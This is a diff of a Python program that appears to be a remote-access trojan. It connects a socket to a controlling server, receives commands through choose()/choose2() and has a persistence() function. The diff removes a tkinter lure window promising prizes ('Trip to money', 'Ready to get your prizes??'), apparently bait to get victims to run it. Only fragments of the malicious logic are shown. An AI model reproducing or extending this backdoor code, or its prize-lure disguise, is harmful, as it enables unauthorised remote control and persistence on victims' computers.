@@ -9,18 +9,6 @@ import platform
 import base64
 import shutil
 from sys import *
-import tkinter as tk
-
-root = tk.Tk()
-
-
-canvas1 = tk.Canvas(root, width = 500, height = 500)
-canvas1.pack()
-
-entry1 = tk.Entry(root)
-canvas1.create_window(200, 140, window=entry1)
-
-canvas1.title("Trip to money")  # Adding a title
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # IP DEL SERVER
@@ -143,29 +131,6 @@ def persistence():
     else:
         print("This system not allow this option")
     choose()
-
-def assess ():
-    options = tk.StringVar(canvas1)
-    options.set("Kigali") #
-    l1 = tk.Label(canvas1,  text='City', width=20 )  
-    l1.grid(row=2,column=1)#
-    om1 =tk.OptionMenu(canvas1, options, "Qatar","Dakar", "Liberia")
-    om1.grid(row=2,column=2)#
-    entry1 = tk.Entry (root) 
-    canvas1.create_window(200, 140, window=entry1)
-    button1 = tk.Button(text='Send', command=assess,bg='brown',fg='white')
-    canvas1.create_window(200, 180, window=button1)
-
-label1 = tk.Label(root, text= 'Hello Hello! Ready to get your prizes??', fg='green', font=('helvetica', 24, 'bold'))
-canvas1.create_window(150, 200, window=label1)
-
-button2 = tk.Button(text='Start', command=assess,bg='brown',fg='white')
-canvas1.create_window(200, 180, window=button2)
-
-
-root.mainloop()
-
-
 
 def choose2():
     escoje = client.recv(1024)
